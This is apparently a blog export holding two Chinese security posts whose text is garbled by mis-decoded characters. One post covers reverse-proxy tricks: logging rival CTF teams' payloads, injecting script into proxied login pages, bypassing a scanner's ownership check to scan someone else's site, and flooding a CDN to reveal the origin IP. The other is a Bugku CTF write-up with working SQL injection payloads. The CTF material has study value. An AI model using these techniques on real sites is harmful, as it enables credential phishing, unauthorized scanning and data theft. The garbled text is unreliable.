‰∏Ä‰∫õÊúâÊÑèÊÄùÁöÑ‰∏úË•øÈô§‰∫Ü‰∏äËø∞ÊâÄËØ¥ÁöÑÂ•ó‰∏Ä‰∏™CDNÔºåËÆ©Ëá™Â∑±ipÂèòÊàê1.1.1.1Êù•ÈöêËóèËá™Â∑±Á´ôÁÇπipÔºåËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÂ•ΩÁé©ÁöÑ~ CTFÁ∫ø‰∏ã‰∏≠ÁöÑ‰∏Ä‰∫õÊÄùË∑ØÂõ†‰∏∫Êàë‰ª¨Á∫ø‰∏ãËµõ‰∏≠ÊØèÊîØÈòü‰ºçÁöÑwebÁ´ôÁÇπÈÉΩ‰∏ÄÊ†∑ÔºåÁ¨îËÄÖÂú®‰πãÂâçÁöÑ‰∏ÄÊ¨°Á∫ø‰∏ãËÆ≠ÁªÉËµõÁöÑÊó∂ÂÄôÂ∞ùËØïËøá‰øÆÊîπapacheÈÖçÁΩÆÊñá‰ª∂Êù•Âèç‰ª£ÂàÜÊï∞ÊúÄÈ´òÁöÑÈòü‰ºçÁöÑÁ´ôÁÇπÔºå‰ªéËÄåËææÂà∞ÊµÅÈáèËΩ¨Âèë(‰º§ÂÆ≥ËΩ¨Áßª)ÁöÑÊïàÊûú„ÄÇËøô‰∏™ÂÖ∑‰ΩìËÉΩ‰∏çËÉΩÂÆûÁé∞ÂæóÁúãÊúçÂä°Âô®ÁöÑÊùÉÈôêËÉΩÊèêÂçáÂà∞Â§öÈ´òÔºåÂÖ∂Ê¨°‰πüÂæóÊ†πÊçÆÂÖ∑‰ΩìÁöÑcheckÊú∫Âà∂Êù•ÁÅµÊ¥ª‰ΩøÁî®„ÄÇÂ¶ÇÊûúÊèêÂçáÁöÑÊùÉÈôê‰∏çÂ§üÈ´òÁöÑËØùÔºå‰πüÂèØ‰ª•ÈÖçÁΩÆ.htaccessÊù•ÂÆûÁé∞Âèç‰ª£„ÄÇÁî®tcpdumpÂÄíÊµÅÈáèÈ°∫ÊâãÊäì‰∏ÄÊ≥¢Âà´‰∫∫ÁöÑpayload„ÄÇÂ¶ÇÊûúÊàë‰ª¨ÈááÁî®ÁöÑÊòØ.htaccessÊñπÊ≥ïËøõË°åÂèçÂêë‰ª£ÁêÜÔºåËøôÈáåËØ¥‰∏Ä‰∏ãËøôÁßçÊñπÊ≥ïÁöÑÂéüÁêÜÂíåÂÖ∂‰ªñÁöÑ‰∏çÂêåÂú®‰∫éÂÆÉÊú¨Ë¥®‰∏äÊòØÂà©Áî®.htaccessÊò†Â∞ÑÂà∞‰∏Ä‰∏™phpÊñá‰ª∂ÔºåÁÑ∂ÂêéÂà©Áî®phpÊñá‰ª∂ÂéªÊäìÂèñÁõÆÊ†áÊúçÂä°Âô®ÁöÑ‰ø°ÊÅØËøîÂõûÁªôÂÆ¢Êà∑Á´Ø„ÄÇËøôÈáå.htaccessÈÖçÁΩÆÁöÑ‰ΩúÁî®ÊòØÈáçÂÜôurl„ÄÇÊâÄ‰ª•Êàë‰ª¨‰∏çÂ¶®Âú®Ëøô‰∏™phpÊñá‰ª∂‰∏≠ÂåÖÂê´‰∏Ä‰∏ãËøô‰∏™demo1.phpÂç≥ÂèØËææÂà∞payloadÁöÑËÆ∞ÂΩïÁöÑÊïàÊûúÔºö ‰ª£Á†ÅÂ¶Ç‰∏ãÔºödemo1.php12345678910111213141516171819202122232425262728&lt;?phpwrite_log();function get_http_raw() &#123; $raw = ''; $raw .= $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n"; foreach($_SERVER as $key =&gt; $value) &#123; if(substr($key, 0, 5) === 'HTTP_') &#123; $key = substr($key, 5); $key = str_replace('_', '-', $key); $raw .= $key.': '.$value."\r\n"; &#125; &#125; $raw .= "\r\n"; $raw .= file_get_contents('php://input'); return $raw;&#125;function write_log()&#123; $data = date("Y/m/d H:i:s")."\r\n".get_http_raw()."\r\n\r\n"; $file = fopen('log1.txt', 'a'); //Êó•ÂøóË∑ØÂæÑ fwrite($file, $data); fclose($file); &#125; ËÆ∞ÂΩïÂ¶Ç‰∏ã: ÂÖãÈöÜÁΩëÁ´ô ‚Äì‰∏≠Èó¥‰∫∫ÊîªÂáªÊàë‰ª¨ÂèØ‰ª•ÂÆâË£Ö‰∏Ä‰∏™nginxÁöÑÁ¨¨‰∏âÊñπÊ®°Âùóngx_http_substitutions_filter_module,ÁÑ∂ÂêénginxÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠Âä†ÂÖ•‰∏ÄÊÆµÔºåÂç≥ÂèØÂºπÁ™óÁ≠â„ÄÇ 1subs_filter &lt;/head&gt; &quot;&lt;script&gt;alert(&apos;1&apos;);&lt;/script&gt;&lt;/head&gt;&quot;; locationÈÉ®ÂàÜÁöÑÈÖçÁΩÆÂ¶Ç‰∏ãÔºö ËøôÈáåÊúâ‰∏™ÂùëÂºÑ‰∫ÜÊàëÂ•Ω‰πÖ‚Ä¶ Â∞±ÊòØÊàë‰ª¨ËØ∑Ê±ÇÁΩëÁ´ôÁöÑÊó∂ÂÄôÔºåÊï∞ÊçÆÂåÖÂ§¥ÈÉ®‰∏ÄËà¨‰ºöÊúâAccept-EncodingÈÉ®ÂàÜÔºåÂ¶Ç‰∏ãÂõæÊâÄÁ§∫ÔºåËøô‰∏™ÈÉ®ÂàÜÂëäËØâÊúçÂä°Âô®ÔºåÂÆ¢Êà∑Á´ØËÉΩ‰ª•ÊÄéÊ†∑ÁöÑÂΩ¢ÂºèËß£Á†Å„ÄÇÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåÊï∞ÊçÆÂåÖÊòØÂéãÁº©ÁöÑÔºåÊàë‰ª¨ÊÄéÊ†∑ÊâçËÉΩÁî®subs_filter ÊõøÊç¢ÂÖ∂‰∏≠ÁöÑÂÜÖÂÆπÂë¢Ôºü ÂÖ∂ÂÆûÊ≠£ÂÉè‰∏äÈù¢Êà™ÂõæÁöÑÈÖçÁΩÆÈÇ£Ê†∑ËÆæÁΩÆÔºöÂèç‰ª£ÊúçÂä°Âô®ËØ∑Ê±Ç‰∏äÊ∏∏ÊúçÂä°Âô®ÁöÑÊó∂ÂÄôÂ∏¶‰∏äAccept-Encoding=‚Äò ‚Äô Âç≥ÂèØÔºåË°®Á§∫‰∏çÊé•Âèó‰ªª‰ΩïÂéãÁº©Êï∞ÊçÆ„ÄÇ ËÆøÈóÆhttps://a.cuit.store,ÊïàÊûúÂ¶Ç‰∏ãÔºö ËøôÊ†∑Â¶ÇÊûúÊàë‰ª¨Âèç‰ª£‰∏Ä‰∏™ÁôªÂΩïÈ°µÈù¢ÔºåÊØîÂ¶ÇqqÁ©∫Èó¥ÔºåÁÑ∂ÂêéÊ§çÂÖ•Êàë‰ª¨ÁöÑjsËÑöÊú¨ÔºåÂêéÊûúemmm‚Ä¶ÂΩìÁÑ∂‰∫ÜÔºå‰∏çÂêåÁ´ôÁöÑÂèç‰ª£ÈöæÂ∫¶ÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑ~ ÁªïËøáÁΩëÁ´ôÊâÄÊúâÊùÉÈ™åËØÅÔºåË∞ÉÁî®Âú®Á∫øÁöÑ‰∫ëÊâ´ÊèèÂô®ÁªôÊàë‰ª¨ÈúÄË¶ÅÊ∏óÈÄèÁöÑÁΩëÁ´ôËøõË°åÊâ´Êèè‰ª•‰∫∫‰∫∫Êâ´Ëøô‰∏™‰∫ëÊâ´ÊèèÂπ≥Âè∞‰∏∫‰æãÔºöhttps://www.renrenscan.com/Ôºå ÂÖ∂‰∏≠ÈúÄË¶ÅÊàë‰ª¨Êää‰∏Ä‰∏™ËÆ§ËØÅÊñá‰ª∂ÊîæÂà∞ÁΩëÁ´ôÊ†πÁõÆÂΩï‰∏äÔºåÊàë‰ª¨ÂèØ‰ª•ËÆæÁΩÆÂèç‰ª£ËßÑÂàôÁöÑÊó∂ÂÄôÔºåÂØπËøô‰∏™Êñá‰ª∂ËøõË°åÊéíÈô§Ôºå‰∏çËøõË°å‰ª£ÁêÜÂç≥ÂèØÁªïËøáÔºåÊàñËÄÖÁõ¥Êé•Áî®.htaccessÁöÑÊñπÊ≥ïËøõË°åÂèç‰ª£Â∞±Ë°å„ÄÇËøôÊ†∑Êàë‰ª¨Âè™ÈúÄË¶ÅÁ≠âÂæÖÊâ´ÊèèÁªìÊûúÔºåÂç≥ÂèØgetÁõÆÊ†áÁ´ôÁöÑÊºèÊ¥û‰∫Ü~ Â¶ÇÊûúÊàë‰ª¨ÂÜçÈÇ™ÊÅ∂‰∏ÄÁÇπ‚Ä¶.È°∫‰æø‰πüÂèØ‰ª•ÂåÖÂê´‰∏ädemo1.phpÔºåÊääËøô‰∫õÊâ´ÊèèÁöÑpayloadÈÉΩÂØºÂá∫Êù•‰∏ãÊù•(ÊâãÂä®ÊªëÁ®Ω) psÔºöËøôÈáåËØ¥ÁÇπÂÖ∂‰ªñÁöÑÔºåÊàëÂèëÁé∞Âú®ÁªôÊàëÂçöÂÆ¢Âä†cdnÁöÑÊó∂ÂÄôÔºåÂèëÁé∞‰∫ÜÂ¶Ç‰∏ãÂõæÊâÄÁ§∫ÁöÑËøô‰∏™ÔºåÂõ†‰∏∫ÊàëÁî®ÁöÑÊòØcloudflareÂÖçË¥πÁâàÁöÑÂ•óÈ§êÔºåÂèØ‰ª•ÁúãÂà∞ÊúâÂæàÂ§öËØ∑Ê±ÇÊ≤°ÊúâÁªèËøáCDNÂ§ÑÁêÜÂ∞±Áõ¥Êé•ÂõûÊ∫ê‰∫ÜÔºåËøôÂ∞±ÂèØ‰ª•ËÆ©Êàë‰ª¨ÊÉ≥Âà∞Â¶ÇÊûúÊàë‰ª¨Ê∏óÈÄèÁöÑÁ´ôÁÇπÊòØÂ•ó‰∫ÜCDNÁöÑÔºåÂ∏∏ËßÑÁöÑÊâæÈÇÆ‰ª∂ÊúçÂä°Âô®ÔºåÈùôÊÄÅÊñá‰ª∂ÔºåssrfÂï•ÁöÑÂ¶ÇÊûúÈÉΩ‰∏çÁÆ°Áî®ÔºåËøò‰∏çÂ¶ÇÊù•ÁÇπÁÆÄÂçïÁ≤óÊö¥ÁöÑÔºåÊö¥ÂäõÂèëÂåÖËÆ©CDNÊâøÂèó‰∏ç‰ΩèËÄåÂõûÊ∫êÔºåËøôÊ†∑ÁúüÂÆûip‚ÄôËΩªÊùæ‚Äôget~ 0x04: ÂèçÂêë‰ª£ÁêÜ‰∏çÂΩì‰∏ÄËà¨ÂΩìÊàë‰ª¨ÈÅáÂà∞‰∫ÜÂèç‰ª£ÊúçÂä°Âô®ÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ËØïÁùÄÁî®burpsuiteÁöÑrepeatÂäüËÉΩÔºåËÆæÁΩÆhost‰∏∫Âèç‰ª£ÊúçÂä°Âô®ÔºåÁÑ∂ÂêéÊäähttpËØ∑Ê±Ç‰∏≠ÁöÑË∑ØÂæÑÊîπ‰∏∫ÂÜÖÁΩë‰∏≠ÁöÑhost(‰∏ÄËà¨ÈúÄË¶ÅÁ©∑‰∏æÔºåÁ©∑‰∏æÁΩëÊÆµipÁ´ØÂè£ÂüüÂêçÁ≠âÁ≠â)„ÄÇÂõ†‰∏∫ÂèçÂêë‰ª£ÁêÜÁöÑÊú¨Ë¥®Â∞±ÊòØÂ∞ÜÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±ÇurlÈáçÂÜôÂêéÂèëÂæÄ‰∏äÊ∏∏ÊúçÂä°Âô®ÔºåÂ∞ÜËøîÂõûÁªìÊûúÂèëÂõûÂÆ¢Êà∑Á´ØÔºåÂú®Ëøô‰πã‰∏≠ÔºåÂ¶ÇÊûúÂØπË∑ØÂæÑÁöÑÈÖçÁΩÆ‰∏çÂΩìÂ∞±ÊúâÂèØËÉΩÂØºËá¥ÂèçÂêë‰ª£ÁêÜÂèòÊ≠£Âêë‰ª£ÁêÜÂØºËá¥‰∏Ä‰∫õ‰ø°ÊÅØÊ≥ÑÈú≤ÔºåÂÜÖÁΩëÁ©øÈÄèÁ≠âÁ≠âÊºèÊ¥û„ÄÇ ÂèÇËÄÉÔºöÈôåÈôåwebÊúçÂä°Âô®PathÂ§ÑÁêÜ‰∏çÂΩìÂèØ‰ª•Ê≠£Âêë‰ª£ÁêÜÂÜÖÁΩëÁ©øÈÄè‰ª£ÁêÜÊ¥ûË∞∑Ê≠åÂÜÖÈÉ®‰∏ªÊú∫‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÊñ∞Êµ™HTTP‰ª£ÁêÜÈÖçÁΩÆ‰∏çÂΩìÊº´Ê∏∏ÂÜÖÁΩëÊåñÊ¥ûÁªèÈ™å‰πã‰ª£ÁêÜ‰∏çÂΩìÊó•ËøõÂÜÖÁΩë ËøòÊúâ‰∏ÄÁßçÂ∞±ÊòØnginx‰∏∫DjangoÂÅöÂèç‰ª£ÁöÑÊó∂ÂÄôÔºåÈùôÊÄÅÊñá‰ª∂ÈÖçÁΩÆÈîôËØØÂØºËá¥Ê∫êÁ†ÅÊ≥ÑÈú≤ ##0x05: Â¶Ç‰ΩïÈò≤Ê≠¢Ë¢´ÂèçÂêë‰ª£ÁêÜÂèçÂêë‰ª£ÁêÜ‰∏ç‰ªÖ‰ºöÂØπÁî®Êà∑ÈÄ†ÊàêÂ®ÅËÉÅÔºåËÄå‰∏îÂØπÊúçÂä°Âô®Êù•ËØ¥‰πü‰ºöÂ¢ûÂº∫Ë¥üËΩΩÔºåËøòÊúâÂ∞±ÊòØÈÄöËøá‰ª£ÁêÜÁöÑÊñπÂºèÁõóÂèñÁΩëÁ´ôÊï∞ÊçÆÔºåËøòÊúâÂ∞±ÊòØseoÁõ∏ÂÖ≥ÁöÑÂΩ±Âìç‰∫ÜÁ≠âÁ≠â‚Ä¶ ÈÄöËøájsÈò≤Ê≠¢Âèç‰ª£ÔºöÂ¶ÇÊûúÂú∞ÂùÄÊ†èÁöÑÁΩëÂùÄ‰∏çÊòØwww.passer6y.funÈÇ£‰πàÂ∞±ËøõË°åË∑≥ËΩ¨„ÄÇ12345&lt;script type=&quot;text/javascript&quot;&gt;if (document.domain !=&apos;www.passer6y.fun&apos;)&#123; window.location.href=&apos;https://www.passer6y.fun/&apos;;&#125;&lt;/script&gt; ÂÖ∂ÂÆûËøôÁßçÊñπÊ≥ïËøòÊòØÂèØ‰ª•ÁªïËøáÁöÑÔºånginxÊúâÊâ©Â±ïÊ®°ÂùóÂèØ‰ª•Â∞ÜÊåáÂÆöÁöÑÂ≠óÁ¨¶ËøõË°åÊõøÊç¢ÔºåËøôÊó∂Êàë‰ª¨Âè™ÈúÄÂ∞ÜtargetÂüüÂêçÊõøÊç¢ÊàêÊàë‰ª¨Ëá™Â∑±ÁöÑÂ∞±Ë°å‰∫Ü(‰∏äÊñáÊúâËØ¥Âà∞Â¶Ç‰ΩïÊõøÊç¢)„ÄÇÊàñËÄÖÁõ¥Êé•‰∏ç‰ª£ÁêÜËøô‰∏™jsÊñá‰ª∂‰πüË°å„ÄÇ php 123456&lt;?php if($_SERVER[&apos;SERVER_NAME&apos;] != &apos;www.passer6y.fun&apos; ) &#123; header(&apos;Location: https://www.passer6y.fun/&apos;);&#125; ?&gt; .htaccess .htaccess123RewriteEngine On RewriteBase / php_value auto_append_file proxy.php proxy.php12345678&lt;?php $f = getenv(‚ÄúHTTP_X_FORWARDED_FOR‚Äù); $server = getenv(‚ÄúHTTP_HOST‚Äù); if (($f!=‚Äù‚Äù)&amp;&amp;($server!=‚Äùwww.passer6y.fun‚Äù)&#123; echo ‚ÄòÊú¨ÊúçÂä°Âô®Á¶ÅÊ≠¢ÊÅ∂ÊÑèÂèçÂêë‰ª£ÁêÜÔºÅ‚Äô; &#125; ?&gt; 0x06: Apache Âèç‰ª£ÈÖçÁΩÆÊñπÊ≥ï1. windows‰∏ãÔºö‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂ÔºöApache\conf\httpd.confÔºåÂ∞Ü‰ª•‰∏ã‰∏§‰∏™ÂâçÈù¢ÁöÑÊ≥®ÈáäÁ¨¶ÂéªÊéâ„ÄÇ12#LoadModule proxy_module modules/mod_proxy.so#LoadModule proxy_http_module modules/mod_proxy_http.so ÁÑ∂ÂêéÊñ∞Â¢û‰∏Ä‰∏™Apache\conf\vhosts.confÊñá‰ª∂123456789101112131415161718192021&lt;VirtualHost *:80&gt; ServerAdmin admin # ÂüüÂêç‰ø°ÊÅØ ServerName passer6y.cn # ÈÇÆ‰ª∂‰ø°ÊÅØ ProxyRequests Off &lt;Proxy *&gt; Order deny,allow Allow from all &lt;/Proxy&gt; ProxyPass / https://passer6y.cn/ # Â∞Ü‰∏Ä‰∏™ËøúÁ´ØÊúçÂä°Âô®Êò†Â∞ÑÂà∞Êú¨Âú∞ÊúçÂä°Âô®ÁöÑURLÁ©∫Èó¥ ProxyPassReverse / https://passer6y.cn/ # Ë∞ÉÊï¥Áî±ÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®ÂèëÈÄÅÁöÑHTTPÂõûÂ∫îÂ§¥‰∏≠ÁöÑURL„ÄÇ &lt;/VirtualHost&gt; 2. linux‰∏ã ÂèÇËÄÉÔºöhttps://www.leaseweb.com/labs/2014/12/tutorial-apache-2-4-transparent-reverse-proxy/ÊµãËØïÁéØÂ¢ÉÔºöUbuntu 16.04Ôºåapache2Âä†ËΩΩ‚Äùproxy_http‚ÄùÊ®°ÂùóÔºö12sudo a2enmod proxy_httpsudo service apache2 restart Âú®/etc/apache2/sites-available/‰∏ãÔºå‰øÆÊîπÈÖçÁΩÆÔºö123456&lt;VirtualHost *:80&gt; ProxyPreserveHost On ProxyPass / https://192.168.83.1/ # ÊåáÂÆöÊ†πURL(/)‰∏ãÁöÑÂÜÖÂÆπÊò†Â∞ÑÂà∞ÁªôÂÆöÂú∞ÂùÄÁöÑÂêéÁ´ØÊúçÂä°Âô® ProxyPassReverse / https://192.168.83.1/ &lt;/VirtualHost&gt;~ ÈáçÂêØapacheÁîüÊïàÈÖçÁΩÆÔºö12sudo service apache2 reloadsudo service apache2 restart 3. .htaccessÈÖçÁΩÆÂèçÂêë‰ª£ÁêÜËøôÁßçÊñπÊ≥ïÈÖçÁΩÆÂèçÂêë‰ª£ÁêÜÂáÜÁ°ÆÁöÑËØ¥ÊòØphpÂèçÂêë‰ª£ÁêÜÔºåÊàë‰ª¨ÈÄöËøá.htaccess‰∏≠ÈÖçÁΩÆ‰∏Ä‰∫õÈáçÂÜôËßÑÂàôÔºåÁÑ∂ÂêéÊääËØ∑Ê±ÇÊò†Â∞ÑÂà∞‰∏Ä‰∏™phpÊñá‰ª∂‰∏≠ÔºåËøô‰∏™phpÂ∏ÆÊàë‰ª¨ËØ∑Ê±Ç‰∏äÊ∏∏ÊúçÂä°Âô®ÁöÑÂÜÖÂÆπÔºåÁÑ∂ÂêéÂ∞Ü‰∏äÊ∏∏ÊúçÂä°Âô®ÁöÑËøîÂõûÁöÑÂÜÖÂÆπËé∑ÂèñÂõûÊù•ÂèëÂõûÂÆ¢Êà∑Á´Ø„ÄÇËøôÁßçÈÖçÁΩÆÂèç‰ª£ÁöÑÂ•ΩÂ§ÑÊòØÊâÄÈúÄÊùÉÈôêÊØîËæÉÂ∞èÔºå‰ΩÜÊòØ‰πüÊúâÂæàÂ§öÂºäÁ´ØÔºåÈöèÁùÄÁΩëÁ´ôÁöÑÂ§çÊùÇÂ∫¶ÔºåÊàë‰ª¨ÊâÄÂÜôÁöÑÊäìÂèñÈ°µÈù¢ÁöÑphpËÑöÊú¨ÈöæÂ∫¶Â∞±‰∏çÂ§ß‰∏ÄÊ†∑‰∫Ü„ÄÇ Github‰∏äÊîæ‰∫Ü3‰∏™phpÂèç‰ª£ËÑöÊú¨ÁöÑdemoÔºå‰ΩøÁî®ËØ¥Êòé‰πüËßÅÈáåÈù¢ÁöÑreadmeÂç≥ÂèØ„ÄÇ ##0x07 nginx ÂèçÂêë‰ª£ÁêÜ 1. ÁÆÄÂçïÂèç‰ª£NginxÊ†∏ÂøÉÈÖçÁΩÆÊñá‰ª∂nginx.confÔºö123456789 server &#123; listen 80; # ÁõëÂê¨Á´ØÂè£(webÊúçÂä°Á´ØÂè£) server_name localhost; # ÂΩìÂâçÊúçÂä°ÁöÑÂüüÂêçÔºåËøôÈáåÊòØÊú¨Âú∞ÊµãËØï location / &#123; # ËøôÈáåÁöÑ/ Ë°®Á§∫ÊääÊúçÂä°Âô®ÁöÑÊ†πÁõÆÂΩïÂèç‰ª£Âà∞www.baidu.comÁöÑÊ†πÁõÆÂΩï„ÄÇ proxy_pass https://www.baidu.com; proxy_redirect default; &#125;&#125; 2. ÂÆû‰æãÔºöÂèç‰ª£Google ÊµãËØïÁéØÂ¢ÉÔºöcent os7Êù°‰ª∂ÂáÜÂ§áÔºö‰∏Ä‰∏™ÂüüÂêçÔºåOneinStack‰∏ÄÈîÆÂÆâË£ÖlnmpÔºåLet‚Äôs Encrypt ÁöÑsslËØÅ‰π¶ Êé•‰∏ãÊù•ÁºñËæënginx‰∏ãÁöÑ‰∏ªÊú∫ÈÖçÁΩÆÊñá‰ª∂Ôºö/usr/local/nginx/conf/vhost/ÁÑ∂ÂêéÂú®ÊúÄÂêéÊèíÂÖ•Ôºö1234567location / &#123; proxy_set_header Host &quot;www.google.com&quot;; proxy_set_header User-Agent $http_user_agent; proxy_set_header Connection &quot;&quot;; proxy_http_version 1.1; proxy_pass https://www.google.com;&#125; Ê£ÄÊµãNginxÈÖçÁΩÆÊòØÂê¶Ê≠£Á°ÆÔºö123[root@vultr vhost]# nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful ÈáçËΩΩNginxÊúçÂä°Ôºö12[root@vultr vhost]# service nginx reloadReloading nginx configuration (via systemctl): [ OK ] ÊâìÂºÄgoogle.cuit.storeÔºåÊàêÂäü~ 0x08 ÁªìËØ≠ËøôÊ¨°‰ªãÁªç‰∫ÜÊàëÊâÄ‰∫ÜËß£ÁöÑ‰∏âÁßçÂèç‰ª£ÊÉÖÂÜµ‰ª•ÂèäÂÖ∂‰∏≠‰∏Ä‰∫õÊúâÊÑèÊÄùÁöÑÁé©Ê≥ï„ÄÇÁ¨îËÄÖËÉΩÂäõÊúâÈôêÔºåÁ¨¨‰∏ÄÊ¨°ÂÜôÊñáÁ´†Êúâ‰ªÄ‰πàÁêÜËß£‰∏çÂØπÁöÑÂú∞ÊñπËøòËØ∑Â§ßÂÆ∂Â§öÂ§öÊåáÁÇπÔºÅ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku Write Up]]></title>
    <url>%2F2018%2F07%2F04%2Fbugkuwp%2F</url>
    <content type="text"><![CDATA[‰πãÂâçÂà∑ËøáÁöÑbugkuÔºåËøôÊ¨°Êää‰πãÂâçÁöÑËß£È¢òÊÄùË∑ØËøáÁ®ãÈÉΩÊÄªÁªìÂà∞‰∏ÄËµ∑‰∫ÜÔºåÂ∑Æ‰∏çÂ§öÊúâ40ÈÅìÂêßÂ∫îËØ•ÁÆóÊØîËæÉÂÖ®‰∫Ü„ÄÇÊú¨ÊñáÂ±ûiÊò•ÁßãÂéüÂàõÂ•ñÂä±ËÆ°ÂàíÔºåÂéüÊñáÈìæÊé• Bugku Write UpÂâçË®Ä‰πãÂâçÂà∑ËøáÁöÑbugkuÔºåËøôÊ¨°Êää‰πãÂâçÁöÑËß£È¢òÊÄùË∑ØËøáÁ®ãÈÉΩÊÄªÁªìÂà∞‰∏ÄËµ∑‰∫ÜÔºåÂ∑Æ‰∏çÂ§öÊúâ40ÈÅìÂêßÂ∫îËØ•ÁÆóÊØîËæÉÂÖ®‰∫Ü„ÄÇ Êä•Èîô È¢òÁõÆËØ¥ÔºöËÆøÈóÆÂèÇÊï∞‰∏∫Ôºö?id=x‰∏çÂÖÅËÆ∏ÂåÖÂê´‚Äú‚Äì‚ÄùÔºåÁ©∫Ê†ºÔºåÂçïÂºïÂè∑ÔºåÂèåÂºïÂè∑Ôºå‚Äúunion‚ÄùÂÖ≥ÈîÆÂ≠óÔºåÊü•ËØ¢Êñá‰ª∂‰∏≠ÂåÖÂê´‚Äú‚ÄùÔºàÂèåÂºïÂè∑ÔºâÈáåÈù¢ÁöÑÂÜÖÂÆπÔºåÈúÄË¶ÅÊü•ËØ¢ÁöÑÊñá‰ª∂Ë∑ØÂæÑ‰∏∫Ôºö/var/test/key_1.php ÈíàÂØπ‰∏äËø∞ËøáÊª§ÔºåÊàë‰ª¨ÂèØ‰ª•ÈááÁî®Â¶Ç‰∏ãÂäûÊ≥ïÁªïËøáÔºö Á©∫Ê†ºÔºö/**/ --ÔºöÁî®# union: uni%00on ÂºïÂè∑ÔºöhexÁºñÁ†Å ‰∏ãÈù¢Â∞±ÂèØ‰ª•ÂºÄÂøÉÁöÑÁé©ËÄç‰∫Ü~ÁàÜÂ∫ì:1https://103.238.227.13:10088/id=0x3122/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x3a(select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/0,1),floor(rand()*2),0x3a,0x3a/**/)name/**/from/**/information_schema.tables/**/group/**/by/**/name)/**/b)/**/# ÂèëÁé∞Á¨¨‰∫å‰∏™Êï∞ÊçÆÂ∫ìÔºösql41‰∏çËøáflagÂπ∂‰∏çÂú®ËøôÔºå‰ªñËÆ©Êàë‰ª¨Êü•ËØ¢Êñá‰ª∂Ë∑ØÂæÑ„ÄÇÂèÇËÄÉËøôÁØáÊñáÁ´†ÊÄªÁªìÁöÑ12‰∏™ÈîôÊñπÂºèfloorÊä•ÈîôÊÄé‰πà‰πüËØª‰∏çÂá∫Êñá‰ª∂Ôºå‰∫éÊòØËØï‰∫Ü‰∏Ä‰∏ãextractvalueÊä•ÈîôÔºö1https://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/hex(load_file(0x2f7661722f746573742f6b65795f312e706870)))))/**/# ËøôÈáåÂæóÊääload_file()Êï¥‰∏™ÂáΩÊï∞ÁªôhexÁºñÁ†ÅÔºå‰∏çÁÑ∂‰∏çÁü•ÈÅì‰∏∫Âï•Ôºå‰∏çÂá∫Êï∞ÊçÆËØªÂá∫flagÔºö‰∏çËøá,ËøôÂè™ÊòØÂÖ∂‰∏≠ÁöÑ‰∏ÄËäÇÔºåÊàë‰ª¨ËøòÂæóÊÉ≥ÂäûÊ≥ïÂºÑÂà∞ÂêéÈù¢ÁöÑÂ≠óÁ¨¶ÔºåËøôÈáåÈááÁî®substr()Ôºö 1https://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/concat(0x5c,substr((load_file(0x2f7661722f746573742f6b65795f312e706870)),100,30),0x5c)),0x5c))/**/# Êà™Êñ≠Âá†Ê¨°ÂêéÂèØ‰ª•ÁúãÂà∞flagÔºö ËøôÈ¢òÁúüÂùëÂïäÔºåË¶ÅÁî®‰∏≠ÊñáÁöÑ‰∏§‰∏™Âè≥ÂèåÂºïÂè∑ÂåÖË£πÊâçËÉΩÊàêÂäü‰∫§‰∏äÂéª‚Ä¶Flag:‚Äù7249f5a7fd1de602b30e6f39aea6193a‚Äù insert into ÂèÇËÄÉÊñáÁ´†Ôºö https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html https://www.jianshu.com/p/232071aa51ba È¢òÁ§∫‰ø°ÊÅØÔºö1234567891011121314151617181920212223flagÊ†ºÂºèÔºöflag&#123;xxxxxxxxxxxx&#125;‰∏çÂ¶ÇÂÜô‰∏™PythonÂêßerror_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); Ê†πÊçÆÈ¢òÁ§∫‰ø°ÊÅØÂèØ‰ª•Áü•ÈÅìÔºöÂè™ÊúâÊèíÂÖ•„ÄÇÊ≤°ÊúâËæìÂá∫ÔºåÂèØ‰ª•Áî®Êó∂Èó¥Áõ≤Ê≥®„ÄÇÊó∂Èó¥Áõ≤Ê≥®Â∞±ÊòØÂú®‰πãÂêéËøîÂõûÁöÑÂÜÖÂÆπÁõ∏ÂêåÔºåÊ≤°Ê≥ïËøõË°åÂà§Êñ≠ÁöÑÊó∂ÂÄôÔºõÂú®mysqlÊï∞ÊçÆÂ∫ì‰∏≠ÊèíÂÖ•sleep()ÂáΩÊï∞ÔºåÂ¶ÇÊûú()ËØ≠Âè•ËÉΩÊ≠£Á°ÆÊâßË°åÁöÑËØùÔºå&amp;&amp;Â∞±‰∏ç‰ºöÁü≠Ë∑ØÔºåsleep()ÂèØ‰ª•ÊâßË°åÔºåËøôÊ†∑ÂìçÂ∫îÊó∂Èó¥Â∞±‰ºöÂ¢ûÂ§ßÔºõËÄå()ÂèëÁîüÈîôËØØÊ≤°ÊúâËøîÂõûÁªìÊûúÊó∂Ôºå&amp;&amp;‰ºöÊääsleep()ÂáΩÊï∞Áü≠Ë∑ØÊó†Ê≥ïÊâßË°åÔºõ‰º™ÈÄ†ËØ∑Ê±ÇÂ§¥